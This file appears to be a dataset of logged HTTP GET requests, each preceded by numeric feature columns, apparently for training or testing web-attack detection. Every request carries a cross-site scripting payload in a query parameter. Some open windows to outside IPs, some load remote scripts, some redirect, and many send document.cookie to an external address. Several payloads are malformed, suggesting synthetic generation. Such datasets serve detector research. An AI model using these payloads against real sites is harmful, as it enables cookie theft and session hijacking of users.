82,1,200,5363,8,30,16,6,2,GET /?name=<script>%window.open('http://241.218.130.22/927860')3C/script> HTTP/1.1
79,1,200,5378,8,30,16,6,2,GET /?file=<script>%window.open('http://244.1.63.45/304295')3C/script> HTTP/1.1
80,1,200,4049,7,28,17,6,2,GET /?p=<script><script+src="http://23.131.176.133/441167.js=></script> HTTP/1.1
78,1,200,5509,8,27,16,6,2,GET /?p=<script>%window.open('http://77.193.233.98/804643')3C/script> HTTP/1.1
79,1,200,7719,7,40,14,5,2,GET /?search=<script>window.location.href="http://13.2.27.64"</script> HTTP/1.1
79,1,200,1666,8,27,16,6,2,GET /?p=<script>%window.open('http://240.21.108.221/130801')3C/script> HTTP/1.1
83,1,200,3260,7,33,17,6,2,GET /?search=<script><script+src="http://244.94.87.232/26280.js=></script> HTTP/1.1
83,1,200,2800,7,31,17,6,2,GET /?file=<script><script+src="http://120.192.14.171/741959.js=></script> HTTP/1.1
84,1,200,7126,8,32,16,6,2,GET /?search=<script>%window.open('http://237.158.197.105/23521')3C/script> HTTP/1.1
102,1,200,6908,7,56,19,6,2,GET /?search=<script>window.location='http://149.63.157.70/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,1029,8,30,16,6,2,GET /?name=<script>%window.open('http://158.50.172.103/503979')3C/script> HTTP/1.1
83,1,200,2000,7,31,17,6,2,GET /?name=<script><script+src="http://27.192.219.120/564029.js=></script> HTTP/1.1
99,1,200,6503,7,54,19,6,2,GET /?file=<script>window.location='http://34.58.42.148/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,1168,7,38,14,5,2,GET /?file=<script>window.location.href="http://108.120.167.126"</script> HTTP/1.1
101,1,200,7667,7,54,19,6,2,GET /?name=<script>window.location='http://189.23.254.197/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,6425,7,40,14,5,2,GET /?search=<script>window.location.href="http://118.172.229.184"</script> HTTP/1.1
82,1,200,5993,7,31,17,6,2,GET /?name=<script><script+src="http://65.50.169.187/439177.js=></script> HTTP/1.1
82,1,200,1578,7,38,14,5,2,GET /?file=<script>window.location.href="http://144.105.153.240"</script> HTTP/1.1
80,1,200,3072,7,38,14,5,2,GET /?file=<script>window.location.href="http://145.22.15.165"</script> HTTP/1.1
102,1,200,5779,7,54,19,6,2,GET /?file=<script>window.location='http://117.189.242.119/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,6615,8,30,16,6,2,GET /?file=<script>%window.open('http://192.18.3.175/907386')3C/script> HTTP/1.1
82,1,200,3093,8,30,16,6,2,GET /?name=<script>%window.open('http://250.206.49.190/178588')3C/script> HTTP/1.1
84,1,200,5578,7,33,17,6,2,GET /?search=<script><script+src="http://21.63.142.204/548570.js=></script> HTTP/1.1
81,1,200,3162,8,30,16,6,2,GET /?name=<script>%window.open('http://81.42.124.212/828021')3C/script> HTTP/1.1
80,1,200,2499,8,32,16,6,2,GET /?search=<script>%window.open('http://8.30.82.75/418400')3C/script> HTTP/1.1
103,1,200,6007,7,56,19,6,2,GET /?search=<script>window.location='http://199.144.119.65/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5167,7,31,17,6,2,GET /?name=<script><script+src="http://31.175.218.59/80876.js=></script> HTTP/1.1
81,1,200,6372,8,30,16,6,2,GET /?file=<script>%window.open('http://16.226.204.149/99827')3C/script> HTTP/1.1
85,1,200,6731,7,33,17,6,2,GET /?search=<script><script+src="http://194.132.93.193/664376.js=></script> HTTP/1.1
85,1,200,5361,8,32,16,6,2,GET /?search=<script>%window.open('http://158.157.246.246/917988')3C/script> HTTP/1.1
82,1,200,3629,8,30,16,6,2,GET /?file=<script>%window.open('http://96.252.227.177/308974')3C/script> HTTP/1.1
84,1,200,1718,8,32,16,6,2,GET /?search=<script>%window.open('http://79.182.251.251/765412')3C/script> HTTP/1.1
83,1,200,7004,8,32,16,6,2,GET /?search=<script>%window.open('http://57.69.245.251/820677')3C/script> HTTP/1.1
102,1,200,7122,7,56,19,6,2,GET /?search=<script>window.location='http://131.52.21.185/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,3727,8,30,16,6,2,GET /?file=<script>%window.open('http://50.235.70.113/210837')3C/script> HTTP/1.1
83,1,200,1082,7,31,17,6,2,GET /?name=<script><script+src="http://190.174.98.244/221288.js=></script> HTTP/1.1
82,1,200,4268,7,31,17,6,2,GET /?file=<script><script+src="http://164.35.85.101/726647.js=></script> HTTP/1.1
101,1,200,5610,7,56,19,6,2,GET /?search=<script>window.location='http://80.70.238.45/?cookie='+document.cookie</script> HTTP/1.1
97,1,200,3549,7,54,19,6,2,GET /?file=<script>window.location='http://88.244.2.2/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,1237,7,31,17,6,2,GET /?file=<script><script+src="http://58.141.65.57/646388.js=></script> HTTP/1.1
101,1,200,1830,7,56,19,6,2,GET /?search=<script>window.location='http://30.57.232.49/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,7564,7,33,17,6,2,GET /?search=<script><script+src="http://97.82.12.245/59017.js=></script> HTTP/1.1
81,1,200,6230,7,38,14,5,2,GET /?name=<script>window.location.href="http://36.231.198.182"</script> HTTP/1.1
80,1,200,7649,7,38,14,5,2,GET /?name=<script>window.location.href="http://17.32.202.185"</script> HTTP/1.1
96,1,200,5488,7,51,19,6,2,GET /?p=<script>window.location='http://50.32.201.90/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,2538,7,35,14,5,2,GET /?p=<script>window.location.href="http://50.224.180.196"</script> HTTP/1.1
103,1,200,1600,7,56,19,6,2,GET /?search=<script>window.location='http://24.145.136.191/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,1817,7,31,17,6,2,GET /?name=<script><script+src="http://107.126.8.210/865346.js=></script> HTTP/1.1
80,1,200,6510,8,30,16,6,2,GET /?file=<script>%window.open('http://93.244.77.59/583115')3C/script> HTTP/1.1
103,1,200,7123,7,56,19,6,2,GET /?search=<script>window.location='http://166.85.173.165/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,7349,8,27,16,6,2,GET /?p=<script>%window.open('http://247.133.133.211/860706')3C/script> HTTP/1.1
104,1,200,5421,7,56,19,6,2,GET /?search=<script>window.location='http://134.130.208.158/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1657,7,40,14,5,2,GET /?search=<script>window.location.href="http://33.159.141.103"</script> HTTP/1.1
101,1,200,2294,7,54,19,6,2,GET /?name=<script>window.location='http://227.194.21.207/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,3202,7,56,19,6,2,GET /?search=<script>window.location='http://29.190.3.1/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1219,7,40,14,5,2,GET /?search=<script>window.location.href="http://114.117.227.35"</script> HTTP/1.1
101,1,200,2188,7,54,19,6,2,GET /?file=<script>window.location='http://122.122.147.49/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,6737,7,56,19,6,2,GET /?search=<script>window.location='http://78.38.9.3/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,6700,7,38,14,5,2,GET /?name=<script>window.location.href="http://18.10.43.55"</script> HTTP/1.1
82,1,200,7579,7,40,14,5,2,GET /?search=<script>window.location.href="http://168.77.167.42"</script> HTTP/1.1
102,1,200,3086,7,54,19,6,2,GET /?file=<script>window.location='http://106.236.251.162/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,7092,7,54,19,6,2,GET /?name=<script>window.location='http://255.119.77.123/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,6550,7,51,19,6,2,GET /?p=<script>window.location='http://16.114.144.244/?cookie='+document.cookie</script> HTTP/1.1
97,1,200,7442,7,51,19,6,2,GET /?p=<script>window.location='http://220.163.9.237/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,5272,7,56,19,6,2,GET /?search=<script>window.location='http://231.58.222.94/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,6633,7,54,19,6,2,GET /?file=<script>window.location='http://114.241.248.105/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,1960,7,56,19,6,2,GET /?search=<script>window.location='http://243.224.94.120/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,3462,7,54,19,6,2,GET /?name=<script>window.location='http://54.169.232.37/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,6729,7,56,19,6,2,GET /?search=<script>window.location='http://25.38.138.128/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,6369,7,31,17,6,2,GET /?name=<script><script+src="http://239.64.249.142/168489.js=></script> HTTP/1.1
98,1,200,2385,7,51,19,6,2,GET /?p=<script>window.location='http://194.225.130.87/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,4974,7,54,19,6,2,GET /?name=<script>window.location='http://135.25.193.64/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,7370,7,54,19,6,2,GET /?name=<script>window.location='http://203.129.64.193/?cookie='+document.cookie</script> HTTP/1.1
104,1,200,3117,7,56,19,6,2,GET /?search=<script>window.location='http://123.138.165.100/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,3488,7,38,14,5,2,GET /?name=<script>window.location.href="http://68.252.250.109"</script> HTTP/1.1
83,1,200,4929,8,30,16,6,2,GET /?name=<script>%window.open('http://198.248.211.101/935271')3C/script> HTTP/1.1
80,1,200,6758,8,30,16,6,2,GET /?file=<script>%window.open('http://86.86.177.13/769330')3C/script> HTTP/1.1
78,1,200,2339,8,27,16,6,2,GET /?p=<script>%window.open('http://51.141.196.11/463683')3C/script> HTTP/1.1
101,1,200,2103,7,54,19,6,2,GET /?file=<script>window.location='http://88.200.169.202/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,6858,8,30,16,6,2,GET /?name=<script>%window.open('http://96.224.95.133/410588')3C/script> HTTP/1.1
100,1,200,5174,7,54,19,6,2,GET /?file=<script>window.location='http://193.26.111.66/?cookie='+document.cookie</script> HTTP/1.1
